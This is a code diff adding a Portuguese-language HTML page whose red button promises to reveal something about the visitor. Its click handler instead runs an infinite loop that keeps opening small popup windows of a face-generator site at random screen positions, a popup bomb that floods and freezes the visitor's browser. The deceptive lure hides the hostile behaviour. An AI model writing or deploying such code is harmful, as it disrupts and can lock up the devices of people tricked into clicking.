@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>...</title>
+  <style>
+    body {
+      display: grid;
+      justify-content: center;
+      align-content: center;
+      height: 100vh;
+      background-image: url('https://i.postimg.cc/VNj9YWsF/Chat-GPT-Image-24-de-jul-de-2025-11-10-59.png');
+      background-repeat: no-repeat;
+      /* não repetir */
+      background-size: cover;
+      /* cobre toda a área */
+      background-position: center center;
+      /* centraliza a imagem */
+    }
+
+    .alert {
+      background-color: white;
+    }
+
+    .esconder-elemento {
+      display: none;
+    }
+
+    .botao-vermelho {
+      background-color: red;
+      /* fundo vermelho */
+      color: black;
+      /* texto preto */
+      text-transform: uppercase;
+      /* tudo em maiúsculas */
+      padding: 12px 24px;
+      /* espaçamento interno */
+      font-size: 16px;
+      /* tamanho da fonte */
+      font-weight: bold;
+      /* texto em negrito */
+      border: none;
+      /* sem borda */
+      border-radius: 8px;
+      /* cantos arredondados */
+      cursor: pointer;
+      /* cursor de mãozinha */
+      box-shadow: 2px 2px 6px rgba(0, 0, 0, 0.2);
+      /* sombra leve */
+      transition: background-color 0.3s ease;
+    }
+  </style>
+</head>
+
+<body>
+  <button class="botao-vermelho">CLIQUE E DESCUBRA ALGO SOBRE VOCE</button>
+  <div class="alert esconder-elemento">
+    <h1>Que os jogos comecem! </h1>
+  </div>
+  <script>
+
+    function gerarPosicaoAleatoria() {
+      const largura = window.innerWidth;
+      const altura = window.innerHeight;
+      const larguraPagina = 80;
+      const alturaPagina = 80;
+
+      const maxLeft = Math.max(0, largura - larguraPagina);
+      const maxTop = Math.max(0, altura - alturaPagina);
+
+      const left = Math.floor(Math.random() * maxLeft);
+      const top = Math.floor(Math.random() * maxTop);
+
+      return { top, left };
+    }
+
+    const elementAlert = document.querySelector('.alert')
+    const elementButton = document.querySelector('.botao-vermelho')
+
+    elementButton.addEventListener('click', () => {
+      elementAlert.classList.remove('esconder-elemento')
+        for (; ;) {
+          window.open(`https://thispersondoesnotexist.com/`, `_blank`, `width=80,height=80,top=${gerarPosicaoAleatoria().top},left=${gerarPosicaoAleatoria().left},toolbar=no,menubar=no,scrollbars=yes,resizable=yes`)
+        }
+    })
+
+
+  </script>
+</body>
+
+</html>
